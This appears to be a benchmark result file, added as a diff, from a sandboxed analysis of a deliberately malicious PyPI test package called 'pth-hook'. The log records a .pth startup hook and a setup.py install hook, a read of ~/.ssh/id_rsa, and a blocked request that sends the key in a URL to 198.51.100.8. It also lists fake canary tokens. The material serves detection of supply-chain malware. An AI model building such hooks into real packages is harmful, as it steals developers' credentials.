@@ -1,0 +1,362 @@
+{
+ "schema_version": "1.0",
+ "package": {
+  "name": "pth-hook",
+  "version": "0.1",
+  "ecosystem": "pypi",
+  "sha256": "6061408095863d486971227432dc4d2b0cb4fc5f3fee43c00d9f3988980a40f0",
+  "path": "bench/packages/malicious/pth_hook"
+ },
+ "run": {
+  "sandbox": "bwrap",
+  "network": "sinkhole",
+  "canaries": [
+   "ssh_key",
+   "aws_creds",
+   "npmrc",
+   "gcloud_creds",
+   "docker_config",
+   "aws_secret_env",
+   "github_token_env"
+  ],
+  "phases": [
+   "install",
+   "startup",
+   "import",
+   "call"
+  ],
+  "profiles": [
+   "dev",
+   "ci"
+  ],
+  "variants": [
+   "default",
+   "clock+30d"
+  ],
+  "started_at": "2026-10-27T11:55:33.476619+00:00",
+  "duration_s": 6.31,
+  "stub": false,
+  "tool_versions": {
+   "python": "Python 3.12.3",
+   "bwrap": "bubblewrap 0.9.0",
+   "strace": "strace -- version 6.8",
+   "libfaketime": "/usr/lib/x86_64-linux-gnu/faketime/libfaketime.so.1"
+  }
+ },
+ "events": [
+  {
+   "id": "ev0",
+   "seq": 108,
+   "phase": "install",
+   "trigger": "install",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "startup_hook",
+   "detail": {
+    "file": "pth_hook.pth",
+    "line_text": "import _pth_hook_helper",
+    "executes_code": true
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "layer": "fs_diff",
+    "file": "pth_hook.pth",
+    "line": 1
+   }
+  },
+  {
+   "id": "ev1",
+   "seq": 110,
+   "phase": "install",
+   "trigger": "install",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "install_hook",
+   "detail": {
+    "file": "setup.py",
+    "cmd": "cmdclass"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "layer": "fs_diff",
+    "file": "setup.py",
+    "line": null
+   }
+  },
+  {
+   "id": "ev2",
+   "seq": 111,
+   "phase": "startup",
+   "trigger": "fresh_startup",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "fs_read_sensitive",
+   "detail": {
+    "path": "~/.ssh/id_rsa",
+    "mode": "r"
+   },
+   "canary_hit": true,
+   "canary_ids": [
+    "ssh_key"
+   ],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/_pth_hook_helper.py",
+    "line": 3,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev3",
+   "seq": 112,
+   "phase": "startup",
+   "trigger": "fresh_startup",
+   "profile": "dev",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "url": "http://198.51.100.8/pth?k=-----BEGIN OPENSSH PRIVATE KEY--",
+    "method": "GET",
+    "data_head": "",
+    "headers": ""
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/_pth_hook_helper.py",
+    "line": 4,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev4",
+   "seq": 221,
+   "phase": "install",
+   "trigger": "install",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "startup_hook",
+   "detail": {
+    "file": "pth_hook.pth",
+    "line_text": "import _pth_hook_helper",
+    "executes_code": true
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "layer": "fs_diff",
+    "file": "pth_hook.pth",
+    "line": 1
+   }
+  },
+  {
+   "id": "ev5",
+   "seq": 223,
+   "phase": "install",
+   "trigger": "install",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "install_hook",
+   "detail": {
+    "file": "setup.py",
+    "cmd": "cmdclass"
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "layer": "fs_diff",
+    "file": "setup.py",
+    "line": null
+   }
+  },
+  {
+   "id": "ev6",
+   "seq": 224,
+   "phase": "startup",
+   "trigger": "fresh_startup",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "fs_read_sensitive",
+   "detail": {
+    "path": "~/.ssh/id_rsa",
+    "mode": "r"
+   },
+   "canary_hit": true,
+   "canary_ids": [
+    "ssh_key"
+   ],
+   "outcome": "succeeded",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/_pth_hook_helper.py",
+    "line": 3,
+    "layer": "audit"
+   }
+  },
+  {
+   "id": "ev7",
+   "seq": 225,
+   "phase": "startup",
+   "trigger": "fresh_startup",
+   "profile": "ci",
+   "variant": "default",
+   "capability": "network",
+   "detail": {
+    "url": "http://198.51.100.8/pth?k=-----BEGIN OPENSSH PRIVATE KEY--",
+    "method": "GET",
+    "data_head": "",
+    "headers": ""
+   },
+   "canary_hit": false,
+   "canary_ids": [],
+   "outcome": "blocked",
+   "attributed_to": "pkg",
+   "evidence": {
+    "file": "/w/installed/_pth_hook_helper.py",
+    "line": 4,
+    "layer": "audit"
+   }
+  }
+ ],
+ "static_signals": [],
+ "coverage": {
+  "phases_run": [
+   "install",
+   "startup",
+   "import",
+   "call"
+  ],
+  "profiles_run": [
+   "dev",
+   "ci"
+  ],
+  "variants_run": [
+   "default",
+   "clock+30d"
+  ],
+  "triggers_run": [
+   "call_all",
+   "fresh_startup",
+   "import_all",
+   "install"
+  ],
+  "install_completed": true,
+  "install_note": null,
+  "network": "sinkhole",
+  "callables_total": 1,
+  "callables_exercised": 1,
+  "native_skipped": [],
+  "strace_layer": true,
+  "not_observed": [
+   "no console-script entry points to run"
+  ],
+  "whitelisted_or_dropped_events": 218
+ },
+ "canaries": [
+  {
+   "id": "ssh_key",
+   "kind": "file",
+   "where": ".ssh/id_rsa",
+   "token": "TLCANARYSSHKEY208e334df3ca"
+  },
+  {
+   "id": "aws_creds",
+   "kind": "file",
+   "where": ".aws/credentials",
+   "token": "TLCANARYAWSCREDS684cab359ed5"
+  },
+  {
+   "id": "npmrc",
+   "kind": "file",
+   "where": ".npmrc",
+   "token": "TLCANARYNPMRC294815d91ff4"
+  },
+  {
+   "id": "gcloud_creds",
+   "kind": "file",
+   "where": ".config/gcloud/application_default_credentials.json",
+   "token": "TLCANARYGCLOUDCREDS1348ca299c94"
+  },
+  {
+   "id": "docker_config",
+   "kind": "file",
+   "where": ".docker/config.json",
+   "token": "TLCANARYDOCKERCONFIG57d5a68fda29"
+  },
+  {
+   "id": "aws_secret_env",
+   "kind": "env",
+   "where": "AWS_SECRET_ACCESS_KEY",
+   "token": "TLCANARYAWSSECRETENV40b599aed107"
+  },
+  {
+   "id": "github_token_env",
+   "kind": "env",
+   "where": "GITHUB_TOKEN",
+   "token": "TLCANARYGITHUBTOKENENV015c37266de8"
+  }
+ ],
+ "capability_summary": {
+  "fs_read_sensitive": {
+   "phases": [
+    "startup"
+   ],
+   "profiles": [
+    "ci",
+    "dev"
+   ],
+   "conditional": true,
+   "count": 2,
+   "canary_hit": true
+  },
+  "install_hook": {
+   "phases": [
+    "install"
+   ],
+   "profiles": [
+    "ci",
+    "dev"
+   ],
+   "conditional": true,
+   "count": 2,
+   "canary_hit": false
+  },
+  "network": {
+   "phases": [
+    "startup"
+   ],
+   "profiles": [
+    "ci",
+    "dev"
+   ],
+   "conditional": true,
+   "count": 2,
+   "canary_hit": false
+  },
+  "startup_hook": {
+   "phases": [
+    "install"
+   ],
+   "profiles": [
+    "ci",
+    "dev"
+   ],
+   "conditional": true,
+   "count": 2,
+   "canary_hit": false
+  }
+ }
+}
